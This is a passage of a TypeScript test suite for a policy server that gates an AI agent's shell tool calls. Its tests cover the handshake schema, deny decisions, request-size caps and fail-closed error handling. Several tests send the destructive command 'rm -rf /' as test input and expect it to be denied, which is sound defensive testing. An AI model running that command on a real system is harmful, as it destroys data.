import { describe, expect, it, beforeAll, afterAll } from "bun:test";
import { copyFileSync, mkdirSync, readFileSync, readdirSync, rmSync, rmdirSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { join } from "node:path";
import Ajv2020 from "ajv/dist/2020.js";
import addFormats from "ajv-formats";
import type { AgtVerdict, PolicyBridge } from "agt-bridge";
import {
  startGuardian,
  createMemorySessionContextStore,
  loadSessionContext,
  supplySourceLabels,
} from "../src/index.ts";
import { toRepoRelativeMessage } from "../src/server.ts";
import { dispatchGuardianAnnotator } from "../src/deployment-bridge.ts";
import type { AcsFinalResult } from "../src/acs-result.ts";

// The repository's own handshake schema, five directories up from this
// file: this tree sits at reference-implementations/agt.
const HANDSHAKE_SCHEMA_PATH = fileURLToPath(new URL("../../../../../specification/v0.1.0/handshake.json", import.meta.url));

/** Compiles the ServerHello $def straight out of the pinned handshake.json --
 * not a hand-copied shape -- so this test fails the moment our ServerHello
 * drifts from the schema. */
function validateServerHello(candidate: unknown): void {
  const handshakeSchema = JSON.parse(readFileSync(HANDSHAKE_SCHEMA_PATH, "utf8")) as {
    $defs: { ServerHello: Record<string, unknown> };
  };
  const ajv = new Ajv2020({ strict: true, allErrors: true });
  addFormats(ajv);
  const validate = ajv.compile(handshakeSchema.$defs.ServerHello);
  const valid = validate(candidate);
  if (!valid) {
    throw new Error(`ServerHello failed schema validation: ${JSON.stringify(validate.errors)}`);
  }
}

function makeEnvelope(
  method: string,
  payload: Record<string, unknown>,
  overrides: { id?: number; requestId?: string; sessionId?: string } = {},
): Record<string, unknown> {
  const { id = 1, requestId = crypto.randomUUID(), sessionId = crypto.randomUUID() } = overrides;
  return {
    jsonrpc: "2.0",
    method,
    id,
    params: {
      acs_version: "0.1.0",
      request_id: requestId,
      timestamp: new Date().toISOString(),
      metadata: { agent_id: "agent-1", session_id: sessionId },
      payload,
    },
  };
}

function toolCallEnvelope(command: string, overrides: { id?: number; requestId?: string; sessionId?: string } = {}) {
  return makeEnvelope(
    "steps/toolCallRequest",
    { tool: { name: "run_shell" }, arguments: { command: { value: command } } },
    overrides,
  );
}

/**
 * The request-gate envelope builder the session-state tests use. Takes an
 * overrides object rather than positional arguments, since those tests vary
 * session_id most. A thin wrapper over toolCallEnvelope with the same shape
 * and the same benign default command, adding no envelope-building logic of
 * its own.
 */
function toolCallRequest(overrides: { session_id?: string; request_id?: string; command?: string } = {}): Record<string, unknown> {
  const { session_id, request_id, command = "ls -la" } = overrides;
  return toolCallEnvelope(command, { requestId: request_id, sessionId: session_id });
}

/** The result gate's envelope, per hooks/tool-call-result.json -- `tool`,
 * `exit_status`, `outputs`, and no `arguments` at all. "Bash" is
 * registered in policy/manifest.yaml, so AGT evaluates the redact rule rather
 * than failing closed on an unknown tool. */
function resultEnvelope(value: string, overrides: { id?: number; requestId?: string } = {}) {
  return makeEnvelope(
    "steps/toolCallResult",
    { tool: { name: "Bash" }, exit_status: "success", outputs: [{ value }] },
    overrides,
  );
}

type JsonRpcResponse = {
  jsonrpc: "2.0";
  id: string | number | null;
  result?: Record<string, unknown>;
  error?: { code: number; message: string; data?: unknown };
};

async function postAcs(url: string, body: unknown): Promise<JsonRpcResponse> {
  const res = await fetch(url, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  return (await res.json()) as JsonRpcResponse;
}

/** postAcs against a started guardian rather than a bare URL -- the
 * session-state tests below post several steps per guardian and read
 * `guardian.url` off the same value each time. */
async function postStep(guardian: { url: string }, envelope: unknown): Promise<JsonRpcResponse> {
  return postAcs(guardian.url, envelope);
}

/**
 * Posts a `steps/toolCallRequest` envelope for an arbitrary tool and its
 * arguments, and answers with the final result -- the JSON-RPC `result` for
 * this method, which really is an `AcsFinalResult` (the decision plus its
 * correlation fields), not merely a value that happens to carry the same
 * fields at its top level.
 *
 * `extraPayload`, when given, is spread onto the request payload alongside
 * `tool` and `arguments` -- the seam a later change uses to put `raw_command`
 * on the wire.
 */
async function postToolCallRequest(
  guardian: { url: string },
  toolName: string,
  args: Record<string, unknown>,
  extraPayload?: Record<string, unknown>,
): Promise<AcsFinalResult> {
  const response = await postAcs(
    guardian.url,
    makeEnvelope("steps/toolCallRequest", {
      tool: { name: toolName },
      arguments: Object.fromEntries(Object.entries(args).map(([k, v]) => [k, { value: v }])),
      ...extraPayload,
    }),
  );
  return response.result as unknown as AcsFinalResult;
}

/** The options every session-state test starts from, spread with its own
 * overrides. Extracted from what beforeAll already passed inline. */
const baseOptions = { port: 0, manifestPath: "policy/manifest.yaml" } as const;

/**
 * A stub PolicyBridge that records every snapshot handed to `evaluate` and
 * always answers with `verdict`, regardless of `point`. Exists because the
 * session-state tests need a `result_labels` they chose and a look at the
 * snapshot that reached evaluation, and the real bridge yields neither. It
 * does emit `result_labels` -- `policy/lib/data.json` sets
 * `config.ifc.sink_clearance`, and test/redaction.test.ts measures a real
 * bridge answering `{decision: "allow", result_labels: ["public"]}` -- but
 * AGT propagates the labels it is handed and originates none, so a test
 * driving it could only ever show `public -> public`, which is exactly the
 * pair a session seeded at the lattice floor already reads as. So the tests
 * that need a controlled `result_labels` (and to see what an assembler put in
 * the snapshot) supply this instead of `createBridge(manifestPath)`.
 */
function recordingBridge(seen: unknown[], verdict: AgtVerdict): PolicyBridge {
  return {
    async evaluate(_point, snapshot) {
      seen.push(snapshot);
      return verdict;
    },
    // Nothing else: `PolicyBridge` is only what the request path sends, so a
    // Guardian stand-in does not have to answer the measurement question the
    // conformance harness asks.
  };
}

let url: string;
let close: () => Promise<void>;

beforeAll(async () => {
  const guardian = await startGuardian(baseOptions);
  url = guardian.url;
  close = guardian.close;
});

afterAll(async () => {
  await close();
});

describe("startGuardian POST /acs", () => {
  it("handshake/hello returns a schema-valid ServerHello with timeout_config.default_ms and on_decision_failure: proceed", async () => {
    const response = await postAcs(url, makeEnvelope("handshake/hello", {}, { id: 42 }));

    expect(response.error).toBeUndefined();
    expect(response.id).toBe(42);
    expect(response.result).toBeDefined();

    const serverHello = response.result as Record<string, unknown>;
    validateServerHello(serverHello);
    expect((serverHello.timeout_config as { default_ms: number }).default_ms).toBeGreaterThan(0);
    expect(serverHello.on_decision_failure).toBe("proceed");
  });

  it("steps/toolCallRequest carrying rm -rf / denies, with non-empty reasoning and reason_codes, echoing request_id", async () => {
    const requestId = crypto.randomUUID();
    const response = await postAcs(url, toolCallEnvelope("rm -rf /", { requestId }));

    expect(response.error).toBeUndefined();
    expect(response.result?.decision).toBe("deny");
    expect(response.result?.request_id).toBe(requestId);
    expect(typeof response.result?.reasoning).toBe("string");
    expect((response.result?.reasoning as string).length).toBeGreaterThan(0);
    expect(Array.isArray(response.result?.reason_codes)).toBe(true);
    expect((response.result?.reason_codes as unknown[]).length).toBeGreaterThan(0);
  });

  it("steps/toolCallRequest carrying ls -la allows, echoing request_id", async () => {
    const requestId = crypto.randomUUID();
    const response = await postAcs(url, toolCallEnvelope("ls -la", { requestId }));

    expect(response.error).toBeUndefined();
    expect(response.result?.decision).toBe("allow");
    expect(response.result?.request_id).toBe(requestId);
  });

  it("an unknown method returns a JSON-RPC error in the ACS-reserved -32000..-32099 range, not a decision", async () => {
    // Well-formed envelope (matches the method-prefix pattern, real ACS hook
    // name) but not one this Guardian dispatches -- distinct from a
    // malformed envelope, which fails schema validation instead.
    const response = await postAcs(url, makeEnvelope("steps/sessionStart", {}, { id: 7 }));

    expect(response.result).toBeUndefined();
    expect(response.id).toBe(7);
    expect(response.error).toBeDefined();
    expect(response.error?.code).toBeGreaterThanOrEqual(-32099);
    expect(response.error?.code).toBeLessThanOrEqual(-32000);
  });

  // A steps/* envelope that fails schema validation is a governance outcome,
  // not a transport accident -- denyOnInvalidEnvelope turns it into an
  // honoured deny decision instead of a bare JSON-RPC error.
  // validate-envelope.test.ts's own guard stays accurate: validateEnvelope
  // itself only ever throws. It is server.ts's dispatch, one layer up, that
  // turns that throw into a decision.
  it("answers a schema-invalid steps/* envelope with a deny decision, not a bare error", async () => {
    const requestId = crypto.randomUUID();
    const bad = toolCallEnvelope("rm -rf /", { requestId });
    delete (bad.params as Record<string, unknown>).acs_version;

    const response = await postAcs(url, bad);

    expect(response.error).toBeUndefined();
    expect(response.result).toMatchObject({
      decision: "deny",
      request_id: requestId,
      reason_codes: ["envelope_invalid"],
      policy_references: [],
    });
    expect(typeof response.result?.reasoning).toBe("string");
    expect((response.result?.reasoning as string).length).toBeGreaterThan(0);
  });
});

// The four cases that stay bare JSON-RPC errors even though a schema-invalid
// steps/* envelope and an evaluation failure resolve to deny decisions.
// Grouped together because each one is a distinct reason to stay an error,
// not a variation on one reason: no envelope at all (parse failure), no id
// of any kind to address a decision to, no step to decide about (handshake),
// and no handler for a well-formed method (undispatched).
describe("startGuardian POST /acs -- denyOnInvalidEnvelope's boundary: what stays a JSON-RPC error", () => {
  it("keeps a JSON parse failure a JSON-RPC error — there is no envelope to decide about", async () => {
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "{not json",
    });
    const body = (await res.json()) as JsonRpcResponse;

    expect(body.result).toBeUndefined();
    expect(body.error?.code).toBe(-32700);
    // The id the host adapter's correlation check has to make an exception
    // for: nothing parseable arrived, so there was no id to echo. Pinned here
    // because guardian-client.ts's post() depends on this exact shape to let
    // the refusal code through instead of throwing a mismatch over it.
    expect(body.id).toBeNull();
  });

  it("keeps an unaddressable invalid envelope a JSON-RPC error", async () => {
    // No top-level "id" and no params.request_id: denyOnInvalidEnvelope has
    // nothing to address a decision to, so this must stay an error rather
    // than synthesize an id.
    const response = await postAcs(url, {
      jsonrpc: "2.0",
      method: "steps/toolCallRequest",
      params: { acs_version: "0.1.0" },
    });

    expect(response.result).toBeUndefined();
    expect(response.error?.code).toBe(-32010);
  });

  // Covers the HTTP-level half of this case; deny-on-invalid-envelope.test.ts
  // covers the unit-level half. params.request_id present, top-level id
  // absent -- the one shape where two correct-looking behaviours have to
  // compose: denyOnInvalidEnvelope legitimately returns a decision (it found
  // a usable params.request_id), and asDecisionResponse legitimately refuses
  // to send it (a JSON-RPC *response* needs a non-null id of its own, and
  // this envelope gives it none). The error response below is the honest
  // answer -- pinned here so nobody "simplifies" asDecisionResponse into
  // forwarding a decision the client could never correlate.
  it("keeps an envelope addressable only by params.request_id a JSON-RPC error, since the response itself has no id to carry", async () => {
    const response = await postAcs(url, {
      jsonrpc: "2.0",
      method: "steps/toolCallRequest",
      params: { request_id: "req-1" },
    });

    expect(response.result).toBeUndefined();
    expect(response.error?.code).toBe(-32010);
  });

  it("keeps a handshake failure a JSON-RPC error — a ServerHello is not a decision", async () => {
    const bad = makeEnvelope("handshake/hello", {}, { id: 99 });
    delete (bad.params as Record<string, unknown>).acs_version;

    const response = await postAcs(url, bad);

    expect(response.result).toBeUndefined();
    expect(response.error?.code).toBe(-32010);
  });

  it("keeps an undispatched method a JSON-RPC error", async () => {
    const response = await postAcs(url, makeEnvelope("steps/sessionStart", {}, { id: 7 }));

    expect(response.result).toBeUndefined();
    expect(response.id).toBe(7);
    expect(response.error).toBeDefined();
    expect(response.error?.code).toBeGreaterThanOrEqual(-32099);
    expect(response.error?.code).toBeLessThanOrEqual(-32000);
  });

  // Envelope-log tapping: the response for the schema-invalid deny path is a
  // JSON-RPC success rather than an error, so this confirms the tap still
  // pairs request and response for it, the same as any other response.
  it("pairs the request and response in the tap for the schema-invalid deny path, even though the response is now a success", async () => {
    const logPath = join(GUARDIAN_PKG, "tmp-n27-tap-test.jsonl");
    const guardian = await startGuardian({
      port: 0,
      manifestPath: "policy/manifest.yaml",
      envelopeLogPath: logPath,
    });

    try {
      const bad = toolCallEnvelope("rm -rf /", { id: 21 });
      delete (bad.params as Record<string, unknown>).acs_version;

      const response = await postAcs(guardian.url, bad);
      expect(response.result?.decision).toBe("deny");

      await guardian.close();
      const lines = readFileSync(logPath, "utf8").trim().split("\n");
      const entries = lines.map((line) => JSON.parse(line) as { direction: string; rpc_id: unknown });
      expect(entries.map((e) => e.direction)).toEqual(["request", "response"]);
      expect(entries.map((e) => e.rpc_id)).toEqual([21, 21]);
    } finally {
      await guardian.close();
      unlinkSync(logPath);
    }
  });
});

// An unbounded `req.json()` was a fail-open a client could pick by choosing
// how much to send: the rejection past the runtime's own default limit
// surfaces to the host as a bare failure, which under the shipped default
// posture (`proceed`) is an allow. The cap turns it into an answer, and the
// code is one the host reads as a refusal rather than as an accident.
describe("startGuardian POST /acs -- the request body cap", () => {
  /** A body over the 1 MiB cap. Built from the envelope shape rather than a
   * bare blob, so what is refused is a request that is otherwise entirely
   * well-formed -- the size is the only thing wrong with it. */
  function oversizeEnvelope(): Record<string, unknown> {
    return toolCallEnvelope("x".repeat(1_100_000));
  }

  it("refuses a body over the cap with -32010, so the host reads it as a refusal", async () => {
    const response = await postAcs(url, oversizeEnvelope());

    expect(response.result).toBeUndefined();
    expect(response.error?.code).toBe(-32010);
    // Unaddressed, like the parse error: nothing was read, so there is no
    // envelope to take an id from.
    expect(response.id).toBeNull();
  });

  // The declared length is only ever an early exit, so it must not be the
  // ONLY check: a chunked body declares no length at all, and a client is
  // free to declare one and send another. Sent as a stream, which is what
  // makes fetch omit Content-Length and use chunked transfer encoding.
  it("refuses a chunked body over the cap, which declares no length to check", async () => {
    const chunk = new TextEncoder().encode("x".repeat(64 * 1024));
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: new ReadableStream({
        start(controller) {
          for (let i = 0; i < 20; i += 1) controller.enqueue(chunk);
          controller.close();
        },
      }),
      // Bun requires this for a streaming request body.
      duplex: "half",
    } as RequestInit);
    const body = (await res.json()) as JsonRpcResponse;

    expect(body.error?.code).toBe(-32010);
    expect(body.error?.message).toContain("bytes read");
  });

  // A declaration above the cap is refused before the body is read at all,
  // and the message says which of the two checks refused -- "you declared 4
  // MiB" and "you sent 4 MiB having declared nothing" are different client
  // bugs, and an operator reading the log needs to know which.
  it("refuses on the declared length alone, naming the declaration rather than the bytes", async () => {
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json", "content-length": String(4 * 1024 * 1024) },
      body: "x".repeat(4 * 1024 * 1024),
    });
    const body = (await res.json()) as JsonRpcResponse;

    expect(body.error?.code).toBe(-32010);
    expect(body.error?.message).toContain("content-length declared");
  });

  // The cap must not have become the governance path's new ceiling: an
  // envelope the size of a real edit-a-file call (~64 KiB of content, measured
  // in build-envelope terms) still evaluates, and a deny still denies.
  it("still governs a large-but-legal envelope, so the cap is not a new refusal surface", async () => {
    const response = await postAcs(url, toolCallEnvelope(`rm -rf / # ${"x".repeat(64 * 1024)}`));

    expect(response.error).toBeUndefined();
    expect(response.result?.decision).toBe("deny");
  });

  // The refusal must not take the connection down with it. An unread request
  // body leaves the HTTP/1.1 message unfinished, and Bun answers the next
  // request on that keep-alive connection with an empty 400 -- so a Guardian
  // that cancelled or skipped the oversize body would turn one refusal into a
  // delivery failure for the NEXT step, which a `proceed` posture allows.
  // Refusing one body must not be a way to fail open on the one after it.
  it("leaves the connection usable, so refusing one body does not break the next request", async () => {
    const refused = await postAcs(url, oversizeEnvelope());
    expect(refused.error?.code).toBe(-32010);

    // Same client, same keep-alive connection, immediately afterwards.
    const governed = await postAcs(url, toolCallEnvelope("rm -rf /"));
    expect(governed.error).toBeUndefined();
    expect(governed.result?.decision).toBe("deny");
  });
});

// An unhandled throw from assemblePreToolCallSnapshot, bridge.evaluate, or
// mapVerdict inside handleAcsRequest must never escape uncaught: Bun.serve's
// default error page for a rejected fetch() is `text/html`, not JSON, so
// guardianClient.post's `res.json()` would throw a SyntaxError instead of
// surfacing a JSON-RPC error, acs-hook.ts's catch-all would exit 1 with
// nothing on stdout, and Claude Code would read that as "the hook never
// fired" and let the tool call proceed ungoverned. This test exercises that
// guard against a real (not mocked) AGT evaluation: only mapping.yaml is
// swapped for a fixture that marks `allow` require_policy_references, so a
// genuine AGT "allow" verdict for a benign command (which carries no
// reason/message) makes mapVerdict throw inside handleAcsRequest for real.
describe("startGuardian POST /acs -- evaluation failure inside handleAcsRequest", () => {
  it("answers an evaluation failure with a deny decision", async () => {
    const guardian = await startGuardian({
      port: 0,
      manifestPath: "policy/manifest.yaml",
      mappingPath: "packages/guardian/test/fixtures/mapping.require-policy-references-on-allow.yaml",
    });

    try {
      // res.json() below is exactly guardianClient.post's call: an unhandled
      // rejection reaching Bun.serve's default handler answers with a
      // text/html error page, and res.json() throws a SyntaxError on that
      // body instead of resolving (see guardian-client.ts's `post`).
      // denyOnInvalidEnvelope turns the parseable error this catch produces
      // into a deny decision when there is a request to address it to,
      // keeping AGT's fail-closed evaluation (the real mapVerdict throw
      // here) inside §6.4's honoured path.
      const requestId = crypto.randomUUID();
      const response = await postAcs(guardian.url, toolCallEnvelope("ls -la", { requestId }));

      expect(response.error).toBeUndefined();
      expect(response.result).toMatchObject({
        decision: "deny",
        request_id: requestId,
        reason_codes: ["evaluation_failed"],
        policy_references: [],
      });
      expect(typeof response.result?.reasoning).toBe("string");
      expect((response.result?.reasoning as string).length).toBeGreaterThan(0);
    } finally {
      await guardian.close();
    }
  });
});

const REPO_ROOT = fileURLToPath(new URL("../../../", import.meta.url));
const GUARDIAN_PKG = join(REPO_ROOT, "packages", "guardian");

/**
 * A stable, predictable name rather than an `mkdtempSync` random one. This
 * tree has to live *inside* `packages/guardian/` -- not under a repo-wide
 * temp directory -- because it is a relative-path trick:
 * `validate-envelope.ts` resolves its schema root three directories
 * up from its own `import.meta.url`, so the copy has to sit at the same
 * depth under `packages/guardian/` for that resolution to land one level
 * short, on purpose (see the doc comment below). Bun's workspace module
 * resolution for the copy's own `import`s (`agt-bridge`, etc.) also
 * resolves relative to where the copy physically sits, which only works
 * predictably inside the real package tree.
 *
 * A fixed name means a killed run's leftover copy is not a fresh, unignored
 * directory tsc has never heard of: it is *this* directory, already covered
 * by `.gitignore` and by `tsconfig.json`'s `exclude`, so it cannot make
 * `bun run typecheck` see a stray duplicate of the Guardian's own source. A
 * run that starts while a previous killed run's copy is still here fails
 * loudly (`mkdirSync` on an existing directory throws) rather than quietly
 * reusing stale files -- the cure for that is deleting the leftover
 * directory by hand, not adding recovery logic that would have to guess
 * whether stale contents are safe to remove.
 */
const SCHEMALESS_SCRATCH_DIR = join(GUARDIAN_PKG, "tmp-schemaless-scratch");

/**
 * Runs `body` against a Guardian whose `validate-envelope.ts` cannot find the
 * ACS schemas -- a checkout with no specification/ directory, which
 * is exactly the scenario handleAcsRequest's outer net exists to catch.
 *
 * It is reproduced by *relocation*, not by mocking and not by touching
 * `spec/`. `validate-envelope.ts` derives SCHEMA_ROOT from its own
 * `import.meta.url` as `../../../../../specification/...`, so an identical
 * copy of `packages/guardian/src` placed one directory deeper resolves that
 * path to `reference-implementations/specification/...`, which does not
 * exist. Every line of
 * Guardian code that then runs is the real, current source -- the files are
 * copied at test time, so they cannot drift from `src/` -- and the failure it
 * produces is a real ENOENT out of `readdirSync`, thrown at request time
 * because `buildAjv()` is lazy. The first call to this function gets its own
 * module instance, so it cannot poison the Ajv registry the rest of this
 * suite shares. A later call importing the same fixed
 * `SCHEMALESS_SCRATCH_DIR` path a second time does not get a second fresh
 * instance -- Bun's module cache keys by resolved path, so it gets back the
 * *first* call's already-loaded module, and the freshly copied files on
 * disk for that later call go unread. Benign here (every call copies
 * byte-identical source, and this suite's own Ajv registry is never shared
 * with the copy either way), but worth being precise about now that the
 * directory name is fixed rather than fresh per call.
 *
 * Deletions here are explicit per file (repo constraint: nothing recursive).
 */
async function withSchemalessGuardian(
  body: (guardian: { url: string; logPath: string; close(): Promise<void> }) => Promise<void>,
): Promise<void> {
  const root = SCHEMALESS_SCRATCH_DIR;
  const srcDir = join(root, "src");
  const logPath = join(root, "envelopes.jsonl");
  const copied = readdirSync(join(GUARDIAN_PKG, "src")).filter((f) => f.endsWith(".ts"));
  let guardian: { close(): Promise<void> } | undefined;

  // Everything after this mkdirSync is inside the try: a failure while
  // copying, importing, or booting would otherwise leave a directory of
  // stray .ts files sitting inside packages/guardian.
  mkdirSync(root);
  try {
    mkdirSync(srcDir);
    for (const file of copied) {
      copyFileSync(join(GUARDIAN_PKG, "src", file), join(srcDir, file));
    }

    const relocated = (await import(join(srcDir, "index.ts"))) as typeof import("../src/index.ts");
    const started = await relocated.startGuardian({
      port: 0,
      manifestPath: join(REPO_ROOT, "policy", "manifest.yaml"),
      mappingPath: join(REPO_ROOT, "mapping.yaml"),
      envelopeLogPath: logPath,
    });
    guardian = started;

    await body({ url: started.url, logPath, close: () => started.close() });
  } finally {
    await guardian?.close();
    for (const path of [logPath, ...copied.map((file) => join(srcDir, file))]) {
      try {
        unlinkSync(path);
      } catch {
        // a run that failed early never created every one of these
      }
    }
    for (const dir of [srcDir, root]) {
      try {
        rmdirSync(dir);
      } catch {
        // same
      }
    }
  }
}

/**
 * One scratch directory *per distinct fake source*, not shared the way
 * `SCHEMALESS_SCRATCH_DIR` is shared across `withSchemalessGuardian`'s four
 * tests. Those four all copy the *same* real files every time, so whichever
 * call's module instance Bun's cache happens to answer with behaves
 * identically. These two fake sources differ from each other, and Bun's
 * module cache keys by resolved path: reusing one directory for both would
 * make the second call's `import()` return the *first* call's
 * already-loaded module, silently exercising the wrong test double. Two
 * names, so each call gets a path Bun has never loaded before.
 */
const UNDEFINED_MESSAGE_SCRATCH_DIR = join(GUARDIAN_PKG, "tmp-undefined-message-scratch");
const THROWING_MESSAGE_ACCESSOR_SCRATCH_DIR = join(GUARDIAN_PKG, "tmp-throwing-message-accessor-scratch");

/**
 * A test double, not the real `validate-envelope.ts`. It exists to force a
 * real `Error` whose `.message` has been overwritten to `undefined` through
 * `dispatch`'s one rethrow route -- the same route `withSchemalessGuardian`
 * above uses for a real ENOENT, but that route cannot also produce a
 * non-string `.message`: nothing in the real schema-validation path does
 * that to an error it throws. `EnvelopeValidationError` is redeclared here,
 * distinct from the real one, so `dispatch`'s
 * `error instanceof EnvelopeValidationError` check -- reading *this* file's
 * class, inside the relocated copy -- correctly comes back `false` and
 * rethrows, the same way it would for any error the real module didn't
 * throw as an `EnvelopeValidationError`.
 */
const UNDEFINED_MESSAGE_VALIDATE_ENVELOPE_SOURCE = `
export class EnvelopeValidationError extends Error {}

export function validateEnvelope(_input) {
  const error = new Error("this message is about to be erased");
  error.message = undefined;
  throw error;
}

// Must track validate-envelope.ts's real export surface, not just the three
// symbols this double overrides: server.ts imports BOTH method predicates from
// the same module -- one per assembling gate -- so a double that omits either
// fails to import rather than exercising the pathological throw these tests
// exist for. isToolCallRequest/isToolCallResult mirror the real narrowing
// exactly: unreachable here (validateEnvelope always throws) but a double
// that lies about behaviour is worse than one that does not compile.
// getValidator joined the export surface with check-response.ts
// (validate-envelope.ts's outbound counterpart): server.ts calls
// checkResponse on every response this relocated Guardian builds, and
// checkResponse imports getValidator from
// this same module path -- so a double omitting it fails to import before
// dispatch's rethrow route is ever reached. Its stub always reports valid,
// since these tests are about toRepoRelativeMessage's handling of a
// pathological validateEnvelope throw, not about response-envelope.json.
export function getValidator(_schemaId) {
  const validate = () => true;
  validate.errors = null;
  return validate;
}

// SCHEMA_BASE joined the export surface when check-response.ts began deriving
// its schema id from it. The value is irrelevant here: getValidator above
// ignores its argument.
export const SCHEMA_BASE = "";

export function isToolCallRequest(envelope) {
  return envelope.method === "steps/toolCallRequest";
}

export function isToolCallResult(envelope) {
  return envelope.method === "steps/toolCallResult";
}
`;

/**
 * A second test double, covering the case where `toRepoRelativeMessage`'s
 * own `error instanceof Error ? error.message : error` line can itself
 * throw: `.message` as an accessor that throws on get -- which the plain
 * `undefined`-message double above does not exercise, since overwriting
 * `.message` with a value never triggers a getter. `EnvelopeValidationError`
 * is redeclared here for the same reason as the double above.
 *
 * Deliberately *not* a getPrototypeOf-trapping Proxy. That shape is real and
 * is covered directly, at the unit level,
 * below -- but it cannot reach `toRepoRelativeMessage` unmutated through
 * this route: `dispatch`'s own `error instanceof EnvelopeValidationError`
 * check runs first, and `instanceof` needs exactly the trapped
 * `[[GetPrototypeOf]]` internal method to walk the prototype chain, so the
 * *trap's own thrown Error* replaces the Proxy at that point -- a normal,
 * well-behaved Error reaches the outer catch instead, and the interesting
 * case never arrives. A throwing `.message` accessor has no such problem:
 * `instanceof` never touches `.message`, so a real `Error` carrying one
 * passes through dispatch's check untouched and reaches
 * `toRepoRelativeMessage` exactly as thrown.
 */
const THROWING_MESSAGE_ACCESSOR_VALIDATE_ENVELOPE_SOURCE = `
export class EnvelopeValidationError extends Error {}

export function validateEnvelope(_input) {
  const error = new Error("real message, about to be hidden behind a throwing getter");
  Object.defineProperty(error, "message", {
    get() {
      throw new Error("message getter blew up");
    },
  });
  throw error;
}

// Must track validate-envelope.ts's real export surface, not just the three
// symbols this double overrides: server.ts imports BOTH method predicates from
// the same module -- one per assembling gate -- so a double that omits either
// fails to import rather than exercising the pathological throw these tests
// exist for. isToolCallRequest/isToolCallResult mirror the real narrowing
// exactly: unreachable here (validateEnvelope always throws) but a double
// that lies about behaviour is worse than one that does not compile.
// getValidator joined the export surface with check-response.ts
// (validate-envelope.ts's outbound counterpart): server.ts calls
// checkResponse on every response this relocated Guardian builds, and
// checkResponse imports getValidator from
// this same module path -- so a double omitting it fails to import before
// dispatch's rethrow route is ever reached. Its stub always reports valid,
// since these tests are about toRepoRelativeMessage's handling of a
// pathological validateEnvelope throw, not about response-envelope.json.
export function getValidator(_schemaId) {
  const validate = () => true;
  validate.errors = null;
  return validate;
}

// SCHEMA_BASE joined the export surface when check-response.ts began deriving
// its schema id from it. The value is irrelevant here: getValidator above
// ignores its argument.
export const SCHEMA_BASE = "";

export function isToolCallRequest(envelope) {
  return envelope.method === "steps/toolCallRequest";
}

export function isToolCallResult(envelope) {
  return envelope.method === "steps/toolCallResult";
}
`;

/**
 * Runs \`body\` against a Guardian whose \`validate-envelope.ts\` has been
 * replaced by \`fakeSource\` -- reproducing, through \`dispatch\`'s one
 * rethrow route, a pathological value that a real \`validateEnvelope\`
 * would never throw. Structurally identical to \`withSchemalessGuardian\`: a
 * real, unmodified copy of every other file in \`packages/guardian/src\`,
 * dynamically imported from its own scratch directory so it is a distinct
 * module instance, with only \`validate-envelope.ts\` swapped for the
 * double. No \`envelopeLogPath\` -- these tests need no envelope log, and
 * \`NULL_ENVELOPE_LOG_SINK\`'s totality is already covered elsewhere.
 *
 * \`root\` is the caller's -- one of the two scratch-dir constants above,
 * never shared between two different \`fakeSource\`s (see their doc comment
 * for why that matters here specifically).
 */
async function withFakeValidateEnvelopeGuardian(
  root: string,
  fakeSource: string,
  body: (guardian: { url: string }) => Promise<void>,
): Promise<void> {
  const srcDir = join(root, "src");
  const copied = readdirSync(join(GUARDIAN_PKG, "src")).filter((f) => f.endsWith(".ts") && f !== "validate-envelope.ts");
  let guardian: { close(): Promise<void> } | undefined;

  mkdirSync(root);
  try {
    mkdirSync(srcDir);
    for (const file of copied) {
      copyFileSync(join(GUARDIAN_PKG, "src", file), join(srcDir, file));
    }
    writeFileSync(join(srcDir, "validate-envelope.ts"), fakeSource);

    const relocated = (await import(join(srcDir, "index.ts"))) as typeof import("../src/index.ts");
    const started = await relocated.startGuardian({
      port: 0,
      manifestPath: join(REPO_ROOT, "policy", "manifest.yaml"),
      mappingPath: join(REPO_ROOT, "mapping.yaml"),
    });
    guardian = started;

    await body({ url: started.url });
  } finally {
    await guardian?.close();
    for (const path of [join(srcDir, "validate-envelope.ts"), ...copied.map((file) => join(srcDir, file))]) {
      try {
        unlinkSync(path);
      } catch {
        // a run that failed early never created every one of these
      }
    }
    for (const dir of [srcDir, root]) {
      try {
        rmdirSync(dir);
      } catch {
        // same
      }
    }
  }
}

// `dispatch` rethrows any non-EnvelopeValidationError, and the outer net in
// handleAcsRequest is what catches it: an uncaught rethrow would leave
// Bun.serve answering with its default `text/html` 500, guardian-client's
// unconditional `res.json()` would throw `JSON Parse error: Unrecognized
// token '<'`, acs-hook.ts's catch-all would exit 1 with empty stdout, and
// Claude Code would read that as "the hook didn't fire" and let the tool
// call proceed ungoverned. Without this net, the envelope log would also
// record only the request, leaving the Inspector unable to show that a
// response was ever sent.
describe("startGuardian POST /acs -- the outer net around dispatch", () => {
  it("answers a throw from validateEnvelope itself with parseable JSON-RPC in -32000..-32099, never an HTML 500", async () => {
    await withSchemalessGuardian(async ({ url }) => {
      const res = await fetch(url, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(toolCallEnvelope("ls -la", { id: 5 })),
      });

      // Read as text first and parse by hand, so a regression reports the
      // HTML body it actually got instead of an opaque SyntaxError from
      // res.json() -- which is precisely what guardian-client would throw.
      const text = await res.text();
      expect(text.slice(0, 1)).toBe("{");
      const response = JSON.parse(text) as JsonRpcResponse;

      expect(response.jsonrpc).toBe("2.0");
      expect(response.id).toBe(5);
      expect(response.error).toBeDefined();
      expect(response.error?.code).toBeGreaterThanOrEqual(-32099);
      expect(response.error?.code).toBeLessThanOrEqual(-32000);
    });
  });

  // The real ENOENT `withSchemalessGuardian` provokes names this machine's
  // absolute path in full (`readdirSync` on a schema directory that does
  // not exist at the relocated copy's resolved path). toRepoRelativeMessage
  // strips only the repo-root prefix from it, so the diagnostic remainder
  // (the ENOENT text and the repo-relative path) is still there for a real
  // reader to use, without disclosing where this tree sits on disk.
  it("strips this repo's absolute root out of a real error message before it reaches the client", async () => {
    await withSchemalessGuardian(async ({ url }) => {
      const response = await postAcs(url, toolCallEnvelope("ls -la"));

      expect(response.error).toBeDefined();
      const message = response.error?.message ?? "";
      expect(message).not.toContain(REPO_ROOT);
      expect(message).toContain("ENOENT");
      // The diagnostic remainder: which schema directory was missing,
      // relative rather than absolute. (The *relocated* copy resolves both
